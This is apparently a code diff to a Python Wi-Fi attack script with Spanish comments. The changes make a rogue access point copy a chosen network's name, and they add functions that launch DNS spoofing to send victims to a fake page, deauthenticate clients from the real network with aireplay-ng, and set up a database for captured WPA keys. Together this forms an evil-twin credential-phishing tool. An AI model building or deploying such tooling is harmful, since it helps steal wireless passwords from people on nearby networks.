@@ -57,7 +57,7 @@ def sniff_process(interface):
     sniff(iface=interface,prn=sniffAP,timeout=15)
 
 def clean_screen():
-    os.system('cls' if os.name == 'nt' else 'clear')
+    os.system('clear')
 
 def chose_iface(interface):
     # Listar interfaces disponibles
@@ -156,10 +156,10 @@ def conf_dnsmasq(args,interface,first_ip,last_ip,mask,gateway):
         run_dnsmasq(interface,first_ip,last_ip,mask,gateway)
         pass
 
-def run_rogueAP(interface,channel):
+def run_rogueAP(interface,channel,essid):
     hostapd_text = ['interface='+interface,
                   'driver=nl80211',
-                  'ssid=Fake_AP',
+                  'ssid='+essid,
                   'hw_mode=g',
                   'channel='+channel,
                   'macaddr_acl=0',
@@ -175,15 +175,28 @@ def run_rogueAP(interface,channel):
     # Subproceso
     p = subprocess.Popen(["xterm", "-e", "hostapd", "./hostapd.conf"])
 
-def rogueAP(interface,channel):
+def rogueAP(interface,channel,essid):
     channels = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15']
     if args.mode == "interactivo":
         target_channel = raw_input('Selecciona el canal en el que trabajara RougeAP [1-15]: ')
         while target_channel not in channels:
             target_channel = raw_input('Canal incorrecto, intenta de nuevo: ')
-        run_rogueAP(interface,target_channel)
+        run_rogueAP(interface,target_channel,essid)
     else:
         pass
+
+def dnssnoof(interface):
+    p = subprocess.Popen(["xterm", "-e", "dnssnoof", "-i", interface])
+
+def desAuthentication(interface,bssid):
+    p = subprocess.Popen(["xterm", "-e", "aireplay-ng", "-00", "-a", bssid, interface])
+
+def create_db():
+    os.system("./mysql-db-create.sh rogueap rogueuser roguepassword wpa_keys")
+
+def delete_db():
+    os.system("./mysql-db-delete.sh rogueap rogueuser")
+    pass
 
 def use_mode(args):
     if args.mode == "interactivo" or args.mode == "file":
@@ -215,10 +228,17 @@ def use_mode(args):
             target_bssid = raw_input('Introduce el BSSID de la red Wifi a clonar: ')
             while target_bssid not in networks:
                 raw_input('BSSID no se encuentra... Por favor introduce otro: ')
+            bssid = target_bssid
+            essid = networks[bssid][0]
             # Llamamos a la funcion rogueAP() para crear nuestro RogueAP
-            rogueAP(interface,channel)
+            rogueAP(interface,channel,essid)
             # Llamamos a la funcio conf_dnsmasq() para crear DHCP que usara RogueAP
             conf_dnsmasq(args,interface,first_ip,last_ip,mask,gateway)
+            # Llamamos la funcion dnssnoof() para redirigir a nuetra Fake page
+            dnssnoof(interface)
+            # Llamamos a la funcion desAuthentication()
+            desAuthentication(interface,bssid)
+
 
         if args.mode == "file":
             pass
